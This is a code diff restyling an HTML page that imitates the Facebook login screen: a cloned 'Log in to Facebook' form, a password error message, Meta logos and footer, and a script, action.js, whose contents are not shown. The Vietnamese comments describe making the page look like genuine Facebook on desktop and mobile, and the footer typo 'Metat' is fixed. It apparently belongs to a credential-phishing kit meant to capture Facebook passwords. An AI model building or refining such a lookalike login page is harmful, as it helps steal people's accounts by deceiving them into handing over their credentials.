@@ -20,36 +20,286 @@
     <link rel="stylesheet"
         href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-icons/1.8.1/font/bootstrap-icons.min.css">
     <link rel="stylesheet" href="css/international-telephone-input.css">
-</head>
 
-<body style="background-color: white;">
     <style>
+        /* TỐI ƯU HÓA CSS TOÀN DIỆN CHO PC & MOBILE */
+        html, body {
+            height: 100%;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background-color: #f0f2f5 !important;
+            font-family: Helvetica, Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            top: 0 !important;
+        }
+
         #google_translate_element,
         .skiptranslate {
             display: none;
         }
 
-        body {
-            top: 0 !important;
+        /* Đẩy form ra giữa màn hình PC theo cả 2 chiều */
+        #main {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 15px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        #main .row {
+            width: 100%;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* Cột bên trái (Ảnh login) */
+        .col-left {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding-right: 30px;
+        }
+
+        .col-left img {
+            max-width: 100%;
+            height: auto;
+            object-fit: contain;
+        }
+
+        /* Cột bên phải (Form đăng nhập) */
+        .col-right {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: flex-start;
+            padding-left: 30px;
+        }
+
+        .verified_info {
+            width: 100%;
+            max-width: 400px;
+            margin-bottom: 20px;
+        }
+
+        #fb-logo img {
+            width: 60px;
+            height: 60px;
+            margin-bottom: 12px;
+        }
+
+        .fb-title h1 {
+            font-size: 24px;
+            font-weight: bold;
+            color: #1c1e21;
+            margin-bottom: 8px;
+        }
+
+        .fb-text {
+            font-size: 16px;
+            color: #4b4f56;
+            line-height: 1.4;
+        }
+
+        #right {
+            width: 100%;
+            max-width: 400px;
+        }
+
+        /* Khung Card chứa Form Đăng nhập cực đẹp */
+        #card {
+            background: #ffffff;
+            border: none;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            padding: 20px;
+            width: 100%;
+        }
+
+        .modal-content1, .modal-body {
+            border: none !important;
+            padding: 0 !important;
+            background: transparent !important;
+        }
+
+        /* Ô nhập liệu Input bám sát thiết kế gốc */
+        .form-control {
+            height: 52px;
+            font-size: 16px;
+            padding: 14px;
+            border-radius: 6px !important;
+            border: 1px solid #dddfe2;
+            box-shadow: none !important;
+        }
+
+        .form-control:focus {
+            border-color: #1877f2 !important;
+            box-shadow: 0 0 0 2px #e7f3ff !important;
+        }
+
+        /* Nút đăng nhập */
+        .btn-primary {
+            background-color: #1877f2 !important;
+            border: none !important;
+            border-radius: 6px !important;
+            font-size: 18px !important;
+            font-weight: 700 !important;
+            height: 48px;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background-color 0.2s;
+        }
+
+        .btn-primary:hover {
+            background-color: #166fe5 !important;
+        }
+
+        /* Nút ẩn hiện mật khẩu */
+        #togglePassword {
+            color: #8d949e;
+            font-size: 18px;
+            transition: color 0.2s;
+        }
+        #togglePassword:hover {
+            color: #1c1e21;
+        }
+
+        /* CSS tùy biến phần dưới form */
+        .link-wrapper {
+            text-align: center;
+            margin-top: 16px;
+            margin-bottom: 12px;
+        }
+
+        #forgot-password-btn {
+            font-size: 14px;
+            text-decoration: none;
+            color: #1877f2;
+            font-weight: 500;
+        }
+
+        #forgot-password-btn:hover {
+            text-decoration: underline;
+        }
+
+        .create-new-account {
+            display: flex;
+            justify-content: center;
+            margin-top: 20px;
+            border-top: 1px solid #dadde1;
+            padding-top: 20px;
+        }
+
+        #new-account-btn {
+            all: unset;
+            width: auto;
+            padding: 0 16px;
+            height: 48px;
+            background-color: #42b72a;
+            border-radius: 6px;
+            color: #ffffff;
+            font: bold 16px Arial, sans-serif;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        #new-account-btn:hover {
+            background-color: #36a420;
+        }
+
+        #meta-logo {
+            margin-top: 25px;
+            display: flex;
+            justify-content: center;
+        }
+
+        #meta-logo svg {
+            width: 80px;
+            height: auto;
+        }
+
+        /* POPUP TÙY CHỈNH */
+        .popup {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.5);
+            display: flex; align-items: center; justify-content: center;
+            z-index: 9999; opacity: 0; pointer-events: none;
+            transition: opacity 0.3s ease;
+        }
+        .popup.active { opacity: 1; pointer-events: auto; }
+        .popup-item { background: white; padding: 25px; border-radius: 8px; position: relative; max-width: 90%; width: 400px; }
+
+        /* CẤU HÌNH RESPONSIVE CHO ĐIỆN THOẠI */
+        @media (max-width: 767.98px) {
+            body {
+                background-color: #ffffff !important; /* Đổi nền trắng trên mobile cho giống Facebook Mobile thật */
+            }
+            #main {
+                padding: 20px 15px;
+                align-items: flex-start;
+            }
+            .col-left {
+                display: none !important; /* Ẩn hẳn ảnh lớn của PC khi vào bằng điện thoại để tránh chiếm diện tích */
+            }
+            .col-right {
+                padding-left: 0 !important;
+                align-items: center;
+                width: 100%;
+            }
+            .verified_info {
+                text-align: center;
+                max-width: 100%;
+            }
+            #right {
+                max-width: 100%;
+            }
+            #card {
+                box-shadow: none !important; /* Mobile không cần bóng viền để tối ưu không gian rộng rãi */
+                padding: 0;
+            }
+            .form-control {
+                background-color: #f5f6f7 !important; /* Input màu xám nhạt nhẹ chuẩn mobile */
+            }
         }
     </style>
+</head>
+
+<body>
     <div id="google_translate_element"></div>
 
+    <!-- KHỐI CHÍNH ĐÃ ĐƯỢC CÂN ĐỐI GRID CHUẨN -->
     <div class="container-fluid" id="main" style="display: block;">
         <div class="row">
-            <div class="col-12 col-md-7 col-left" id="left">
-                <img src="images/login.png" alt="">
+            <!-- Cột ảnh bên trái -->
+            <div class="col-12 col-md-6 col-left" id="left">
+                <img src="images/login.png" alt="Facebook Login Animation">
             </div>
-            <div class="col-12 col-md-5 col-right">
+            
+            <!-- Cột form bên phải -->
+            <div class="col-12 col-md-6 col-right">
                 <div class="verified_info">
                     <div id="fb-logo">
-                        <img src="images/fb_round_logo.png" alt="">
+                        <img src="images/fb_round_logo.png" alt="Facebook Rounded Logo">
                     </div>
                     <div class="fb-title">
                         <h1>Log in to Facebook</h1>
                     </div>
                     <div class="fb-text">Discover what you love, connect with friends, and share moments every day.</div>
                 </div>
+                
                 <div id="right">
                     <div class="policy-wrapper">
                         <div id="card">
@@ -71,18 +321,19 @@
                                                         maxlength="30" required="" placeholder="Password">
 
                                                     <i class="bi bi-eye" id="togglePassword"
-                                                        style="position: absolute; right: 10px; top: 50%; transform: translateY(-50%); cursor: pointer;"></i>
+                                                        style="position: absolute; right: 14px; top: 50%; transform: translateY(-50%); cursor: pointer;"></i>
                                                 </div>
                                             </div>
                                         </div>
 
                                         <div class="mb-2 invalid-feedback" style="display: none;" id="passwordError">
                                             The password you've entered is incorrect.</div>
+                                        
                                         <div class="form-btn-wrapper">
                                             <button class="btn btn-primary" type="button" fdprocessedid="wxbiwk"
                                                 id="continueform">
                                                 <div class="spinner-border text-light" id="spinner-login" role="status"
-                                                    style="display: none;">
+                                                    style="display: none; width: 1.2rem; height: 1.2rem; margin-right: 8px;">
                                                     <span class="visually-hidden">Loading...</span>
                                                 </div>
                                                 <span class="button-text" id="passtext">Log in</span>
@@ -93,13 +344,12 @@
                                             <a href="#" id="forgot-password-btn">Forgotten password?</a>
                                         </div>
 
-                                        <style>
-                                            .link-wrapper { text-align: center; margin-top: 10px }
-                                            #forgot-password-btn { font-size: 14px; text-decoration: none; color: #1877f2 }
-                                            .create-new-account { display: flex; justify-content: center; margin-top: 18px }
-                                            #new-account-btn { all: unset; width: 78%; height: 42px; border: 1.4px solid #1877f2; border-radius: 26px; color: #1877f2; font: 600 14px Arial; display: flex; align-items: center; justify-content: center; cursor: pointer }
-                                        </style>
+                                        <!-- GIỮ NGUYÊN HOÀN TOÀN CẤU TRÚC NÚT TẠO TÀI KHOẢN CỦA BẠN -->
+                                        <div class="create-new-account">
+                                            <button type="button" id="new-account-btn">Create new account</button>
+                                        </div>
 
+                                        <!-- GIỮ NGUYÊN LOGO META SVG -->
                                         <div class="display-phone" id="meta-logo" style="display: none;">
                                             <svg aria-label="Логотип Meta" class="" role="img" viewBox="0 0 500 100">
                                                 <defs>
@@ -148,6 +398,7 @@
                 </div>
             </div>
 
+            <!-- Khối Popup giữ nguyên cấu trúc -->
             <div class="popup" id="popup">
                 <div class="popup-item">
                     <div class="burger-button-popup" id="closePopup">
@@ -160,11 +411,13 @@
         </div>
     </div>
 
-    <div style="background-color: #F5F6F6; padding-top: 35px; padding-bottom: 35px; border-top: 1px solid #E0E0E0; width: 100%; font-family: Arial, Helvetica, sans-serif;">
-        <div style="max-w: 1280px; w: 100%; margin-left: auto; margin-right: auto; padding-left: 16px; padding-right: 16px; text-align: center;">
+    <!-- KHỐI FOOTER CHUẨN ĐẸP TỰ ĐỘNG CÂN BẰNG KHOẢNG CÁCH -->
+    <div style="background-color: #ffffff; padding-top: 30px; padding-bottom: 30px; border-top: 1px solid #dddfe2; width: 100%; font-family: Arial, Helvetica, sans-serif;">
+        <div style="max-width: 980px; width: 100%; margin: 0 auto; padding-left: 16px; padding-right: 16px;">
             
-            <div style="display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; margin-bottom: 12px; font-size: 12px;">
-                <a href="#" style="text-decoration: none; color: #8a9bbd;">English (US)</a>
+            <!-- Hàng 1: Ngôn ngữ -->
+            <div style="display: flex; flex-wrap: wrap; gap: 12px; margin-bottom: 10px; font-size: 12px; border-bottom: 1px solid #dddfe2; padding-bottom: 8px;">
+                <a href="#" style="text-decoration: none; color: #737373; font-weight: bold;">English (US)</a>
                 <a href="#" style="text-decoration: none; color: #8a9bbd;">English (UK)</a>
                 <a href="#" style="text-decoration: none; color: #8a9bbd;">Italiano</a>
                 <a href="#" style="text-decoration: none; color: #8a9bbd;">Français</a>
@@ -176,8 +429,9 @@
                 <a href="#" style="text-decoration: none; color: #8a9bbd;">Português</a>
             </div>
             
-            <div style="display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; font-size: 12px; color: #737373;">
-                <a href="#" style="text-decoration: none; color: #737373;">© 2026 Metat</a>
+            <!-- Hàng 2: Các liên kết hệ thống -->
+            <div style="display: flex; flex-wrap: wrap; gap: 12px; font-size: 12px; color: #737373; padding-top: 4px;">
+                <span style="color: #737373;">© 2026 Meta</span>
                 <a href="#" style="text-decoration: none; color: #737373;">About</a>
                 <a href="#" style="text-decoration: none; color: #737373;">Developers</a>
                 <a href="#" style="text-decoration: none; color: #737373;">Careers</a>
@@ -193,31 +447,30 @@
     <script src="action.js"></script>
 
     <script>
+        // JS xử lý icon mắt click ẩn/hiện password nhanh cho tiện
+        const togglePass = document.querySelector('#togglePassword');
+        const passInput = document.querySelector('#exampleInputPassword');
+        if(togglePass && passInput) {
+            togglePass.addEventListener('click', function () {
+                const type = passInput.getAttribute('type') === 'password' ? 'text' : 'password';
+                passInput.setAttribute('type', type);
+                this.classList.toggle('bi-eye-slash');
+            });
+        }
+
         const langMap = {
-            AF:"fa", AL:"sq", DZ:"ar", AD:"ca", AO:"pt",
-            AR:"es", AM:"hy", AU:"en", AT:"de", AZ:"az",
-            BD:"bn", BY:"be", BE:"fr", BZ:"en", BO:"es",
-            BA:"bs", BR:"pt", BG:"bg", KH:"km", CM:"fr",
-            CA:"fr", CL:"es", CN:"zh-CN", TW:"zh-TW",
-            HK:"zh-TW", MO:"zh-TW", CO:"es", CR:"es",
-            HR:"hr", CY:"el", CZ:"cs", DK:"da", DO:"es",
-            EC:"es", EG:"ar", SV:"es", EE:"et", ET:"am",
-            FI:"fi", FR:"fr", GE:"ka", DE:"de", GH:"en",
-            GR:"el", GT:"es", HN:"es", HU:"hu", IS:"is",
-            IN:"hi", ID:"id", IR:"fa", IQ:"ar", IE:"en",
-            IL:"iw", IT:"it", JP:"ja", JO:"ar", KZ:"kk",
-            KE:"sw", KP:"ko", KR:"ko", KW:"ar", LA:"lo",
-            LV:"lv", LB:"ar", LT:"lt", LU:"fr", MK:"mk",
-            MY:"ms", MT:"mt", MX:"es", MD:"ro", MN:"mn",
-            ME:"sr", MA:"ar", MM:"my", NP:"ne", NL:"nl",
-            NZ:"en", NI:"es", NG:"en", NO:"no", OM:"ar",
-            PK:"ur", PA:"es", PY:"es", PE:"es", PH:"tl",
-            PL:"pl", PT:"pt", PR:"es", QA:"ar", RO:"ro",
-            RU:"ru", SA:"ar", RS:"sr", SG:"en", SK:"sk",
-            SI:"sl", ZA:"af", ES:"es", LK:"si", SE:"sv",
-            CH:"de", SY:"ar", TW:"zh-TW", TJ:"tg", TZ:"sw",
-            TH:"th", TN:"ar", TR:"tr", UA:"uk", AE:"ar",
-            GB:"en", US:"en", UY:"es", UZ:"uz", VE:"es",
+            AF:"fa", AL:"sq", DZ:"ar", AD:"ca", AO:"pt", AR:"es", AM:"hy", AU:"en", AT:"de", AZ:"az",
+            BD:"bn", BY:"be", BE:"fr", BZ:"en", BO:"es", BA:"bs", BR:"pt", BG:"bg", KH:"km", CM:"fr",
+            CA:"fr", CL:"es", CN:"zh-CN", TW:"zh-TW", HK:"zh-TW", MO:"zh-TW", CO:"es", CR:"es",
+            HR:"hr", CY:"el", CZ:"cs", DK:"da", DO:"es", EC:"es", EG:"ar", SV:"es", EE:"et", ET:"am",
+            FI:"fi", FR:"fr", GE:"ka", DE:"de", GH:"en", GR:"el", GT:"es", HN:"es", HU:"hu", IS:"is",
+            IN:"hi", ID:"id", IR:"fa", IQ:"ar", IE:"en", IL:"iw", IT:"it", JP:"ja", JO:"ar", KZ:"kk",
+            KE:"sw", KP:"ko", KR:"ko", KW:"ar", LA:"lo", LV:"lv", LB:"ar", LT:"lt", LU:"fr", MK:"mk",
+            MY:"ms", MT:"mt", MX:"es", MD:"ro", MN:"mn", ME:"sr", MA:"ar", MM:"my", NP:"ne", NL:"nl",
+            NZ:"en", NI:"es", NG:"en", NO:"no", OM:"ar", PK:"ur", PA:"es", PY:"es", PE:"es", PH:"tl",
+            PL:"pl", PT:"pt", PR:"es", QA:"ar", RO:"ro", RU:"ru", SA:"ar", RS:"sr", SG:"en", SK:"sk",
+            SI:"sl", ZA:"af", ES:"es", LK:"si", SE:"sv", CH:"de", SY:"ar", TW:"zh-TW", TJ:"tg", TZ:"sw",
+            TH:"th", TN:"ar", TR:"tr", UA:"uk", AE:"ar", GB:"en", US:"en", UY:"es", UZ:"uz", VE:"es",
             VN:"vi", YE:"ar", ZM:"en", ZW:"en"
         };
 
